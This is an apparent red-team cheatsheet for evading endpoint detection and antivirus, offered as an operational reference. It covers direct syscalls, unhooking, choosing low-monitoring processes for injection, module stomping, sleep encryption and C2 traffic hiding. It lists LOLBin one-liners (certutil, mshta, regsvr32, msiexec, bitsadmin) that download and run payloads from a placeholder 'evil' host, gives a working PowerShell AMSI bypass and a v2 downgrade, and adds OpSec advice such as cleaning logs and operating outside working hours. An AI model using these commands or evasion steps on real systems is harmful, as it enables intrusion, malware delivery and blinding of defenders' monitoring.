# EDR/AV Bypass & Stealth Operation Cheatsheet

> Source: multiple red team field experience summaries (2024-2026)
> Applicable scenario: reference when operations must run in environments protected by EDR/AV

---

## Detection Layers and Corresponding Bypasses

| Detection Layer | What the EDR Does | Bypass Idea |
|--------|-----------|---------|
| Static signatures | Match known malicious file hashes/traits | Custom compilation, encrypted payloads, modified traits |
| User-mode hooks | Hook ntdll.dll to monitor API calls | Direct syscalls / Unhooking / ship your own ntdll |
| Kernel callbacks | Register process/thread/image load callbacks | Callback removal (needs a driver) / injection into legitimate processes |
| ETW | Collect events through ETW | Patch EtwEventWrite / disable the provider |
| Behavioral analysis | Analyze call sequences and behavior patterns | Delayed execution / spread operations / mimic normal behavior |
| Memory scanning | Periodically scan process memory | Heap encryption / encrypt payload during sleep / module stomping |
| Network detection | Analyze outbound traffic traits | Domain fronting / legitimate service tunneling / encryption |

---

## Practical Bypass Techniques

### 1. Direct Syscalls (Bypass User-Mode Hooks)

```
Concept: skip ntdll.dll and invoke the kernel directly with the syscall instruction
Tools: SysWhispers3 / HellsGate / TartarusGate
Effect: bypasses all user-mode hooks
```

### 2. Unhooking (Restore the Original ntdll)

```
Method A: re-map ntdll.dll from disk
Method B: load a clean copy from the KnownDlls directory
Method C: copy the .text section from a suspended process
Effect: restores hooked APIs to their original state
```

### 3. Process Injection (Choose Low-Monitoring Targets)

```
Recommended injection targets (low monitoring):
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe (slightly riskier)

Avoid injecting:
- lsass.exe (heavily monitored)
- svchost.exe (some EDRs watch closely)
- powershell.exe / cmd.exe
```

### 4. Module Stomping

```
Concept: write the payload into the .text section of an already-loaded legitimate DLL
Effect: memory scans see a legitimate module, not suspicious RWX memory
```

### 5. Sleep Encryption (Ekko/Zilean)

```
Concept: beacon encrypts its own memory while sleeping
Effect: memory scans find no payload traits
Implementation: register a timer callback, encrypt before sleep, decrypt on wake
```

### 6. Call Stack Spoofing

```
Concept: forge the call stack so API calls appear to come from legitimate code
Effect: bypasses call-stack-based behavioral detection
```

---

## C2 Traffic Stealth

| Technique | Concept | Detection Difficulty |
|------|------|---------|
| Domain fronting | SNI and Host header differ in HTTPS requests | High |
| Cloudflare Workers | Relayed through CF, looks like normal HTTPS | High |
| Azure/AWS legitimate services | Use cloud service APIs as C2 channels | Very High |
| DNS over HTTPS | C2 data encoded in DNS queries | Medium |
| WebSocket | Long connections blending into normal web traffic | Medium |
| ICMP tunneling | Data hidden inside ICMP packets | Low (easy to spot) |

---

## LOLBins (Living Off the Land)

Use legitimate programs shipped with the OS to execute malicious operations:

| Program | Purpose | Example Command |
|------|------|---------|
| certutil | Download files | `certutil -urlcache -split -f http://evil/payload.exe` |
| mshta | Execute HTA | `mshta http://evil/payload.hta` |
| rundll32 | Load DLLs | `rundll32 evil.dll,EntryPoint` |
| regsvr32 | Load SCT | `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| wmic | Remote execution | `wmic /node:target process call create "cmd"` |
| msiexec | Install MSI | `msiexec /q /i http://evil/payload.msi` |
| bitsadmin | Download files | `bitsadmin /transfer job http://evil/payload.exe C:\payload.exe` |
| forfiles | Execute commands | `forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"` |

---

## AMSI Bypass (PowerShell)

```powershell
# Classic patch (may be signature detected)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# More stealthy: reflectively modify AmsiScanBuffer
# Or downgrade PowerShell to v2 (no AMSI)
powershell -version 2
```

---

## Operational Security (OpSec) Principles

1. **Minimal action** — don't touch what needn't be touched; reuse existing credentials instead of creating new ones
2. **Time window** — operate outside the target's working hours (reduces the chance of manual review)
3. **Traffic blending** — C2 frequency and sizes mimic normal business traffic
4. **Tools never touch disk** — execute in memory, clean up immediately after use
5. **Log awareness** — know what logs every operation produces, avoid them preemptively or clean up afterward
6. **Honeypot identification** — spot honeypots before acting (abnormally open services, overly tempting credentials)
7. **Segmented operations** — don't complete all steps in one go; spread them across multiple time windows
